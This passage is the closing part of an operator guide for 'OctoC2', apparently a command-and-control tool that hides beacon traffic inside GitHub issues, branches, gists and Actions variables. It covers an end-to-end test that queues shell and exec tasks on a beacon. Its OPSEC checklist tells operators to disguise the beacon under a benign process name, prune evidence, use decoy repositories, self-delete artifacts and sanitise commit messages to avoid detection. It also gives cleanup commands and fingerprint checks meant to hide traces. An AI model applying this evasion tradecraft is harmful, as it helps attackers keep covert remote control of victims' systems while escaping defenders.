  --grpc --proxy --notes --gist --branch --oidc --secrets --actions \
  --stego --pages --fingerprint --maintenance --openhulud --bulk --cleanup
```

### What the Test Does

1. Validates all required env vars
2. Creates isolated temp directories (never touches production data)
3. Starts the C2 server as a background subprocess
4. Starts the beacon with a 10-second sleep interval
5. Polls `registry.json` until the beacon registers (up to 3 minutes)
6. Queues three tasks: `shell` (`echo "e2e-shell-ok"`), `exec` (`uname -s`), `ping`
7. Polls for results via octoctl (up to 5 minutes)
8. Asserts each result contains expected output
9. Kills server and beacon processes
10. Optionally closes the GitHub issue (`--cleanup`)

### Manual Cleanup

Without `--cleanup`, the script prints the exact cleanup command at the end:

```bash
gh issue close <number> --repo <owner>/<repo>
```

---

## 11. OPSEC Checklist

### Before Deployment

- [ ] Keypair generated with `keygen`; `OCTOC2_OPERATOR_SECRET` stored in encrypted vault
- [ ] `MONITORING_PUBKEY` set as a GitHub Variable on the C2 repo (not baked into binary)
- [ ] C2 repo is private
- [ ] PAT has minimum required scopes (`repo` only unless gist/packages needed)
- [ ] PAT is not stored in plaintext in scripts or shell history
- [ ] GitHub App auth configured (preferred over static PAT) — private key delivered via dead-drop, never baked
- [ ] Beacon binary has been stripped / renamed to a benign process name
- [ ] `OCTOC2_LOG_LEVEL=warn` or `error` set for production (suppresses verbose output)
- [ ] `OCTOC2_CLEANUP_DAYS=3` set to prune evidence from issue comments
- [ ] Decoy repo scaffolded with realistic content (Dockerfiles, configs) if using OctoProxy

### During Operation

- [ ] Task commands do not contain C2-identifying strings in their output
- [ ] Beacon issue title remains `Scheduled maintenance · <shortId>` — do not rename
- [ ] No custom labels applied to the beacon issue
- [ ] Shell REPL session closed (`exit`) when not actively in use
- [ ] Rotate PAT every 30–90 days via dead-drop (`drop create --new-token`)
- [ ] Monitor beacon `status` field — switch to dormant channels if `lost`
- [ ] Avoid queuing tasks that write recognisable artifacts to disk unless `evasion self_delete` follows
- [ ] Avoid rapid-fire task queuing — respect beacon sleep interval to avoid timing anomalies

### Commit Message Hygiene

All git operations performed by the beacon use sanitised commit messages:

- Branch dead-drop commits: `"update"` or `"sync"`
- No `octoc2`, `c2`, `beacon`, `payload`, or operator-identifying strings appear in any commit message

The `--fingerprint` flag in the E2E test verifies this automatically.

### Cleanup Procedures

```bash
# 1. Send kill task to beacon
bun run octoctl/src/index.ts task <beaconId> --kind die

# 2. Wait for beacon to self-terminate (one checkin cycle)

# 3. Close the beacon issue on GitHub
gh issue close <issue-number> --repo <owner>/<repo>

# 4. Delete infra-cache branch (if used)
gh api repos/<owner>/<repo>/git/refs/heads/infra-cache-<id8> -X DELETE

# 5. Delete infra-sync branch (if used)
gh api repos/<owner>/<repo>/git/refs/heads/infra-sync-<id8> -X DELETE

# 6. Delete git notes refs (if used)
git push origin --delete refs/notes/octoc2-<id8>

# 7. Delete ACK variables (if Variables channel used)
gh api repos/<owner>/<repo>/actions/variables/INFRA_CFG_<id8> -X DELETE
gh api repos/<owner>/<repo>/actions/variables/OCTOC2_ACK_<id8> -X DELETE

# 8. Remove beacon from server registry
# Edit data/registry.json and remove the beacon entry

# 9. Revoke PAT if it was only used for this operation
```

---

## 12. Fingerprint Verification

The `--fingerprint` flag in the E2E test script checks that no C2-identifying strings appear in git commit messages, branch names (beyond the expected pattern), or issue content.

### Using the --fingerprint Flag

```bash
# Run fingerprint check alongside channel tests
bun run scripts/test-end-to-end.ts --stego --branch --fingerprint --cleanup
```

The fingerprint check verifies:

1. **Commit messages** on `infra-sync-{id8}` and `infra-cache-{id8}` branches contain only `"update"` or `"sync"` — no `octoc2`, `c2`, `beacon`, `payload`, or operator strings
2. **Branch names** follow the `infra-sync-{id8}` / `infra-cache-{id8}` naming pattern (generic infrastructure terminology)
3. **Issue titles** follow `Scheduled maintenance · {shortId}` (no project identifiers)
4. **Issue labels** — no labels applied (labels are fingerprint vectors)
5. **Comment format** — job markers wrapped in HTML comments (`<!-- job:... -->`) invisible in GitHub web UI

### Manual Checks

```bash
# Check commit messages on infra-sync branch
git log --oneline origin/infra-sync-<id8> | head -20

# Check issue title
gh issue view <issue-number> --repo <owner>/<repo> --json title,labels

# Check branch list for unexpected patterns
gh api repos/<owner>/<repo>/branches --jq '.[].name' | grep -v "^main$"

# Inspect raw comment body (check HTML comment markers)
gh api repos/<owner>/<repo>/issues/<number>/comments --jq '.[].body' | head -5
```

### Expected Patterns

| Artifact | Expected | Suspicious |
|----------|----------|-----------|
| Commit messages | `update`, `sync` | `octoc2`, `beacon`, `c2`, `payload`, `task` |
| Branch names | `infra-sync-<8hex>`, `infra-cache-<8hex>` | `octoc2-*`, `beacon-*`, `c2-*` |
| Issue titles | `Scheduled maintenance · <shortId>` | Any project name, `OctoC2`, `beacon` |
| Issue labels | (none) | Any label |
| Comment bodies | HTML comment markers wrapping job tokens | Plaintext job identifiers |
| Gist names | `octoc2-a-<id8>.json` | (visible only to owner; acceptable) |

---

*End of Operator Production Guide*
